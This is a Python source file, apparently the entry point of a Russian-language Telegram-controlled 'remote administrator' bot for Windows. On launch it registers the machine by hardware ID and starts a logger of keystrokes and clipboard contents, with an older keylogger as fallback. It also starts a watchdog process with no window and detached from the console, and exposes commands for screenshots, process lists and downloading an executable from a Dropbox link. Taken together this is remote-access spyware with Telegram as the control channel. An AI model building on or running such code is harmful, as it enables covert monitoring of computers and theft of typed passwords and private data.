#!/usr/bin/env python3
# main_bot.py
"""
Главный файл для запуска Telegram-бота "Удаленный администратор"
Модульная архитектура с разделением на компоненты:
- bot_core.py - ядро и утилиты
- bot_services.py - системные функции
- bot_commands.py - обработчики команд
- bot_callbacks.py - обработчики callback-кнопок
- database.py - работа с базой данных
- watchdog.py - мониторинг и восстановление
"""

import os
import sys
import time
import logging
import signal
import atexit
import tempfile
import shutil
from datetime import datetime

# Импорт для проверки двойного запуска
try:
    import win32event
    import win32api
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

# Глобальные переменные для очистки
_cleanup_done = False
_temp_dirs_to_clean = []

# Глобальная переменная для хранения мьютекса (чтобы он не освобождался)
_mutex_handle = None

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Константы для мьютекса (импортируем из config)
try:
    from config import MUTEX_NAME as MAINBOT_MUTEX_NAME
except ImportError:
    MAINBOT_MUTEX_NAME = "Global\\MultiAdminMainBotMutex"

def cleanup_temp_dirs():
    """Очистка временных директорий для предотвращения ошибки PyInstaller"""
    global _cleanup_done, _temp_dirs_to_clean
    
    if _cleanup_done:
        return
    
    _cleanup_done = True
    logger.info("[CLEANUP] Начинаю очистку временных директорий...")
    
    # Даем время всем процессам завершиться
    time.sleep(0.5)
    
    # Очищаем все зарегистрированные временные директории
    for temp_dir in _temp_dirs_to_clean:
        try:
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir, ignore_errors=True)
                logger.debug(f"[CLEANUP] Удалена временная директория: {temp_dir}")
        except Exception as e:
            logger.debug(f"[CLEANUP] Не удалось удалить {temp_dir}: {e}")
    
    # Также пытаемся очистить стандартную временную директорию PyInstaller
    if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
        try:
            meipass_dir = sys._MEIPASS
            if os.path.exists(meipass_dir) and meipass_dir.startswith(tempfile.gettempdir()):
                # Ждем еще немного перед удалением
                time.sleep(0.2)
                shutil.rmtree(meipass_dir, ignore_errors=True)
                logger.debug(f"[CLEANUP] Удалена MEIPASS директория: {meipass_dir}")
        except Exception as e:
            logger.debug(f"[CLEANUP] Не удалось удалить MEIPASS: {e}")
    
    logger.info("[CLEANUP] Очистка временных директорий завершена")

def register_temp_dir_for_cleanup(temp_dir):
    """Регистрация временной директории для очистки при выходе"""
    if temp_dir and os.path.exists(temp_dir):
        _temp_dirs_to_clean.append(temp_dir)

def cleanup_mutex():
    """Очистка мьютекса при завершении программы"""
    global _mutex_handle
    if _mutex_handle:
        try:
            win32api.CloseHandle(_mutex_handle)
            logger.debug("[CLEANUP] Мьютекс закрыт")
        except Exception as e:
            logger.debug(f"[CLEANUP] Не удалось закрыть мьютекс: {e}")
        finally:
            _mutex_handle = None

def signal_handler(signum, frame):
    """Обработчик сигналов для корректного завершения"""
    logger.info(f"[SIGNAL] Получен сигнал {signum}, начинаю корректное завершение...")
    if HAS_WIN32:
        cleanup_mutex()
    cleanup_temp_dirs()
    sys.exit(0)

def setup_signal_handlers():
    """Настройка обработчиков сигналов"""
    try:
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        logger.debug("[SIGNAL] Обработчики сигналов установлены")
    except Exception as e:
        logger.warning(f"[SIGNAL] Не удалось установить обработчики сигналов: {e}")

# Регистрируем очистку при выходе
atexit.register(cleanup_temp_dirs)

def check_single_instance():
    """
    Проверка, что бот не запущен в другом процессе
    Возвращает True если можно продолжить запуск, False если уже запущен
    """
    # Создаем временный логгер для этой функции, так как основной logger может быть еще не инициализирован
    temp_logger = logging.getLogger(__name__ + '.single_instance')
    
    if not HAS_WIN32:
        # Если нет win32, используем простую проверку через psutil
        try:
            import psutil
            current_pid = os.getpid()
            current_exe = sys.executable.lower()
            
            for proc in psutil.process_iter(['pid', 'name', 'exe']):
                try:
                    if proc.pid == current_pid:
                        continue
                    
                    # Проверяем, является ли процесс другим экземпляром mainbot
                    if proc.info['exe'] and current_exe in proc.info['exe'].lower():
                        # Проверяем командную строку
                        cmdline = ' '.join(proc.cmdline()).lower()
                        if 'mainbot' in cmdline or 'main_bot' in cmdline:
                            temp_logger.warning(f"Обнаружен другой запущенный процесс mainbot (PID: {proc.pid})")
                            return False
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            return True
        except Exception as e:
            temp_logger.warning(f"Ошибка при проверке процессов: {e}")
            return True  # В случае ошибки разрешаем запуск
    
    # Используем мьютекс Windows для гарантированной проверки
    global _mutex_handle
    try:
        _mutex_handle = win32event.CreateMutex(None, False, MAINBOT_MUTEX_NAME)
        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            temp_logger.error("❌ Другой экземпляр mainbot уже запущен!")
            temp_logger.error("   Закройте все другие окна mainbot.exe и попробуйте снова.")
            # Закрываем мьютекс, так как мы не будем его использовать
            if _mutex_handle:
                try:
                    win32api.CloseHandle(_mutex_handle)
                    _mutex_handle = None
                except:
                    pass
            return False
        temp_logger.info("✅ Проверка двойного запуска пройдена")
        # Мьютекс остается открытым в _mutex_handle до завершения программы
        return True
    except Exception as e:
        temp_logger.warning(f"Ошибка при создании мьютекса: {e}")
        return True  # В случае ошибки разрешаем запуск

def check_dependencies():
    """Проверка наличия необходимых зависимостей"""
    required_modules = [
        'telebot', 'sqlite3', 'psutil', 'pyautogui',
        'PIL', 'pygetwindow', 'pyperclip', 'requests'
    ]
    
    missing_modules = []
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        logger.error(f"Отсутствуют модули: {', '.join(missing_modules)}")
        logger.info("Установите зависимости: pip install -r requirements.txt")
        return False
    
    return True

# Глобальная переменная для предотвращения спама уведомлений
_watchdog_warning_sent = False

def check_watchdog_exe():
    """Проверка наличия файла watchdog.exe с корректным определением пути"""
    global _watchdog_warning_sent
    
    # Определяем правильную директорию для поиска watchdog.exe
    if getattr(sys, 'frozen', False):
        # Если запущен скомпилированный .exe файл
        base_dir = os.path.dirname(sys.executable)
    else:
        # Если запущен как скрипт Python
        base_dir = os.path.dirname(os.path.abspath(__file__))
    
    watchdog_exe_path = os.path.join(base_dir, 'watchdog.exe')
    
    if os.path.exists(watchdog_exe_path):
        if not _watchdog_warning_sent:
            logger.info(f"✅ Файл watchdog.exe найден: {watchdog_exe_path}")
        return True
    else:
        if not _watchdog_warning_sent:
            logger.warning(f"⚠️ Файл watchdog.exe не найден: {watchdog_exe_path}")
            logger.warning(f"   Ищем в директории: {base_dir}")
        return False

def notify_admin_watchdog_missing(bot):
    """Уведомление администратора об отсутствии watchdog.exe (отправляется только один раз)"""
    global _watchdog_warning_sent
    
    if _watchdog_warning_sent:
        return False  # Уже отправляли уведомление
    
    try:
        from config import SUPER_ADMIN_ID
        
        message = (
            "⚠️ Внимание! Файл watchdog.exe не найден.\n"
            "Для загрузки модуля используйте команду:\n"
            "/wd_download <ссылка_на_dropbox>"
        )
        
        bot.send_message(SUPER_ADMIN_ID, message)
        logger.info(f"✅ Уведомление отправлено администратору {SUPER_ADMIN_ID}")
        _watchdog_warning_sent = True  # Помечаем, что уведомление отправлено
        return True
    except Exception as e:
        logger.error(f"[X] Ошибка отправки уведомления администратору: {e}")
        return False

def setup_environment():
    """Настройка окружения"""
    # Создаем необходимые директории
    directories = ['logs', 'screenshots', 'downloads', 'temp']
    for directory in directories:
        os.makedirs(directory, exist_ok=True)
    
    # Проверяем наличие конфигурационного файла
    # Проверяем несколько возможных местоположений для config.py
    config_paths = [
        'config.py',  # Текущая директория
        os.path.join(os.path.dirname(sys.executable), 'config.py'),  # Директория с исполняемым файлом
        os.path.join(sys._MEIPASS, 'config.py') if hasattr(sys, '_MEIPASS') else None,  # PyInstaller временная директория
    ]
    
    config_found = False
    config_file_path = None
    
    for path in config_paths:
        if path and os.path.exists(path):
            config_found = True
            config_file_path = path
            logger.info(f"[OK] Конфигурационный файл найден: {path}")
            break
    
    if not config_found:
        # В режиме PyInstaller config.py может быть встроен в исполняемый файл
        # Проверяем, можем ли мы импортировать config напрямую
        try:
            import config
            logger.info("[OK] Конфигурационный файл успешно импортирован (встроен в EXE)")
            config_found = True
        except ImportError:
            logger.error("Файл config.py не найден и не может быть импортирован!")
            logger.info("Создайте config.py с BOT_TOKEN и SUPER_ADMIN_ID")
            logger.info("Или перекомпилируйте с опцией --add-data 'config.py;.'")
            return False
    
    # Если config найден как файл, добавляем его директорию в sys.path
    if config_file_path:
        config_dir = os.path.dirname(os.path.abspath(config_file_path))
        if config_dir not in sys.path:
            sys.path.insert(0, config_dir)
    
    return True

def import_modules():
    """Импорт всех модулей бота"""
    try:
        # Импортируем модули в правильном порядке
        from database import Database
        from bot_core import init_bot, get_bot, db, logger as core_logger
        import bot_services
        import bot_commands
        import readme  # Модуль документации с командой /guide
        
        # Попробуем импортировать bot_callbacks, но если не получится - продолжим
        try:
            import bot_callbacks
            logger.info("[OK] Модуль bot_callbacks успешно импортирован")
        except ImportError as e:
            logger.warning(f"⚠️ Не удалось импортировать bot_callbacks: {e}")
            logger.info("ℹ️ Бот продолжит работу без обработки callback-кнопок")
        
        logger.info("[OK] Все модули успешно импортированы")
        return True
    except ImportError as e:
        logger.error(f"Ошибка импорта модулей: {e}")
        return False
    except Exception as e:
        logger.error(f"Неожиданная ошибка при импорте: {e}")
        return False

def start_bot():
    """Запуск Telegram-бота"""
    try:
        from bot_core import get_bot, init_bot, db
        from config import BOT_TOKEN
        
        # Инициализация бота
        bot = init_bot(BOT_TOKEN)
        
        # Проверка соединения с базой данных
        if not db:
            logger.error("Не удалось подключиться к базе данных")
            return False
        
        # Проверка наличия watchdog.exe (опционально)
        if not check_watchdog_exe():
            logger.info("ℹ️ Watchdog не найден - это нормально, он опционален")
            # Не отправляем уведомление, так как watchdog опционален
            # notify_admin_watchdog_missing(bot)
        
        # Регистрация текущего устройства
        from bot_core import register_device, CURRENT_DEVICE_NAME, CURRENT_HWID
        register_device()
        
        # Инициализация всей системы (добавление SuperAdmin и т.д.)
        from bot_core import init_system
        init_system()
        
        logger.info(f"✅ Бот инициализирован для устройства: {CURRENT_DEVICE_NAME}")
        logger.info(f"🆔 HWID устройства: {CURRENT_HWID}")
        
        # Запуск unified logger в фоновом режиме
        try:
            from unified_logger import start_logging
            start_logging()
            logger.info("[OK] Unified logger запущен (клавиатура + буфер обмена)")
        except Exception as e:
            logger.warning(f"⚠️ Не удалось запустить unified logger: {e}")
            
            # Fallback к старому keylogger если unified logger не работает
            try:
                from bot_services import start_keylogger
                start_keylogger()
                logger.info("[OK] Старый keylogger запущен как fallback")
            except Exception as e2:
                logger.warning(f"⚠️ Не удалось запустить старый keylogger: {e2}")
        
        # Отправка приветственного ping всем SuperAdmin
        try:
            from bot_core import send_welcome_ping
            send_welcome_ping(bot)
            logger.info("[PING] Приветственный ping отправлен SuperAdmin")
        except Exception as e:
            logger.warning(f"⚠️ Не удалось отправить приветственный ping: {e}")
        
        # Запуск бота
        logger.info("[ROCKET] Запускаю бота...")
        logger.info("[LIST] Доступные команды:")
        logger.info("  /start - Приветствие и регистрация")
        logger.info("  /panel - Панель управления")
        logger.info("  /pc_list - Список устройств")
        logger.info("  /info - Информация об устройстве")
        logger.info("  /screen - Скриншот экрана")
        logger.info("  /procs - Список процессов")
        logger.info("  /admin_list - Список администраторов")
        logger.info("  /add_admin - Добавить администратора (SuperAdmin)")
        logger.info("  /del_admin - Удалить администратора (SuperAdmin)")
        logger.info("  /wd_download - Загрузить watchdog.exe")
        logger.info("  /wd_on - Запустить watchdog")
        logger.info("  /wd_off - Остановить watchdog")
        
        # Принудительная очистка webhook перед запуском polling
        try:
            bot.delete_webhook()
            logger.info("[OK] Webhook очищен перед запуском polling")
        except Exception as e:
            logger.warning(f"⚠️ Не удалось очистить webhook: {e}")
        
        # Бесконечный цикл опроса с skip_pending и allowed_updates для предотвращения конфликта 409
        logger.info("[CLOCK] Бот запущен и ожидает сообщений...")
        bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True, allowed_updates=[])
        
        return True
        
    except Exception as e:
        logger.error(f"[X] Критическая ошибка при запуске бота: {e}")
        import traceback
        traceback.print_exc()
        return False

def start_watchdog():
    """Запуск Watchdog в отдельном процессе (опционально)"""
    try:
        import subprocess
        import threading
        
        def run_watchdog():
            """Функция для запуска watchdog в отдельном процессе"""
            try:
                # Определяем правильный путь к watchdog
                if getattr(sys, 'frozen', False):
                    # В скомпилированном режиме запускаем watchdog.exe
                    base_dir = os.path.dirname(sys.executable)
                    watchdog_path = os.path.join(base_dir, 'watchdog.exe')
                    
                    if os.path.exists(watchdog_path):
                        logger.info(f"🔄 Запускаю watchdog.exe: {watchdog_path}")
                        subprocess.Popen(
                            [watchdog_path],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                        )
                    else:
                        logger.warning(f"⚠️ Файл watchdog.exe не найден: {watchdog_path}")
                        # Пытаемся запустить как скрипт как запасной вариант
                        script_dir = os.path.dirname(os.path.abspath(__file__))
                        watchdog_script = os.path.join(script_dir, 'watchdog.py')
                        if os.path.exists(watchdog_script):
                            logger.info(f"🔄 Запускаю watchdog.py как скрипт: {watchdog_script}")
                            subprocess.Popen(
                                [sys.executable, watchdog_script],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                            )
                        else:
                            logger.info("ℹ️ Watchdog не будет запущен (файлы не найдены)")
                            return
                else:
                    # В режиме скрипта запускаем watchdog.py
                    script_dir = os.path.dirname(os.path.abspath(__file__))
                    watchdog_script = os.path.join(script_dir, 'watchdog.py')
                    if os.path.exists(watchdog_script):
                        logger.info(f"🔄 Запускаю watchdog.py: {watchdog_script}")
                        subprocess.Popen(
                            [sys.executable, watchdog_script],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                        )
                    else:
                        logger.info("ℹ️ Watchdog не будет запущен (файл watchdog.py не найден)")
                        return
                    
            except Exception as e:
                logger.warning(f"⚠️ Ошибка при запуске watchdog: {e}")
        
        # Запускаем watchdog в отдельном потоке
        watchdog_thread = threading.Thread(target=run_watchdog, daemon=True)
        watchdog_thread.start()
        logger.info("[OK] Watchdog запущен в фоновом режиме (если доступен)")
        return True
        
    except Exception as e:
        logger.warning(f"⚠️ Не удалось запустить watchdog: {e}")
        logger.info("ℹ️ Бот продолжит работу без watchdog")
        return True  # Возвращаем True, так как watchdog опционален

def main():
    """Главная функция запуска"""
    # Настройка обработчиков сигналов для корректного завершения
    setup_signal_handlers()
    
    # Регистрация очистки мьютекса при выходе
    if HAS_WIN32:
        atexit.register(cleanup_mutex)
    
    print("=" * 60)
    print("[ROCKET] Удаленный администратор v16.0 - Модульная архитектура")
    print("=" * 60)
    
    # Проверка на двойной запуск
    logger.info("[LOCK] Проверка двойного запуска...")
    if not check_single_instance():
        print("[X] ❌ ОШИБКА: Другой экземпляр mainbot уже запущен!")
        print("    Закройте все другие окна mainbot.exe и попробуйте снова.")
        print("    Или проверьте диспетчер задач на наличие процессов mainbot.exe")
        return 1
    
    # Проверка зависимостей
    logger.info("[MAG] Проверка зависимостей...")
    if not check_dependencies():
        print("[X] Проверка зависимостей не пройдена")
        return 1
    
    # Настройка окружения
    logger.info("[GEAR] Настройка окружения...")
    if not setup_environment():
        print("[X] Настройка окружения не удалась")
        return 1
    
    # Импорт модулей
    logger.info("[BOX] Импорт модулей...")
    if not import_modules():
        print("[X] Импорт модулей не удался")
        return 1
    
    # Запуск Watchdog
    logger.info("[DOG] Запуск Watchdog...")
    start_watchdog()
    
    # Запуск бота
    logger.info("[ROBOT] Запуск Telegram-бота...")
    print("\n" + "=" * 60)
    print("[PHONE] Бот запускается...")
    print("[WARN] Для остановки нажмите Ctrl+C")
    print("=" * 60 + "\n")
    
    try:
        success = start_bot()
        if not success:
            print("[X] Запуск бота не удался")
            return 1
        
    except KeyboardInterrupt:
        print("\n\n🛑 Бот остановлен пользователем")
        logger.info("Бот остановлен по команде пользователя")
        
        # Остановка keylogger
        try:
            from bot_services import stop_keylogger
            stop_keylogger()
            logger.info("[OK] Keylogger остановлен")
        except:
            pass
        
        # Очистка временных директорий
        cleanup_temp_dirs()
        
        return 0
        
    except Exception as e:
        print(f"\n[X] Критическая ошибка: {e}")
        logger.error(f"Критическая ошибка в главном цикле: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    return 0

if __name__ == "__main__":
    # Устанавливаем текущую директорию
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    
    # Запускаем главную функцию
    exit_code = main()
    sys.exit(exit_code)
